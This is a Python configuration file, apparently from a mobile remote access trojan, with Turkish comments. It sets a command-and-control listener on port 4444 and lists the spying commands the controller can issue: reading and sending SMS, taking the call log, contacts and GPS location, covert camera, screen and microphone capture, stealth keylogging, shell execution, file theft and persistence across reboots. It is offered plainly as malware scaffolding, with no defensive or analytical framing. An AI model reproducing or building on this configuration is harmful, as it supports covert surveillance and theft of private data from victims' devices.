# rat_config.py

# Server Configuration
SERVER_HOST = "0.0.0.0"  # Dinlenecek IP
SERVER_PORT = 4444       # Dinlenecek port
MAX_CLIENTS = 10         # Max bağlantı

# Komut Listesi
COMMANDS = {
    "sms_read": "SMS'leri okur ve gönderir",
    "sms_send": "Belirtilen numaraya SMS gönderir",
    "call_log": "Arama geçmişini alır",
    "contacts": "Kişileri alır",
    "location": "GPS lokasyonunu alır",
    "camera_front": "Ön kamera fotoğrafı alır",
    "camera_back": "Arka kamera fotoğrafı alır",
    "screen_record": "Ekran kaydı başlatır/durdurur",
    "screen_capture": "Ekran görüntüsü alır",
    "file_list": "Belirtilen dizindeki dosyaları listeler",
    "file_download": "Belirtilen dosyayı indirir",
    "file_upload": "Dosya yükler",
    "shell_exec": "Shell komutu çalıştırır",
    "app_list": "Uygulamaları listeler",
    "app_start": "Uygulama başlatır",
    "app_stop": "Uygulama durdurur",
    "wifi_info": "WiFi bilgilerini alır",
    "battery_info": "Batarya bilgilerini alır",
    "device_info": "Device bilgilerini alır",
    "flash_on": "Flash'ı aç",
    "flash_off": "Flash'ı kapat",
    "microphone_record": "Mikrofon kaydı alır",
    "notification_read": "Notifications'ları okur",
    "keyboard_log": "Keyboard input'larını loglar (stealth)",
    "persistence": "Device reboot'ta tekrar başlatır"
}

# Colors for Console
class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    RESET = "\033[0m"
    BOLD = "\033[1m"
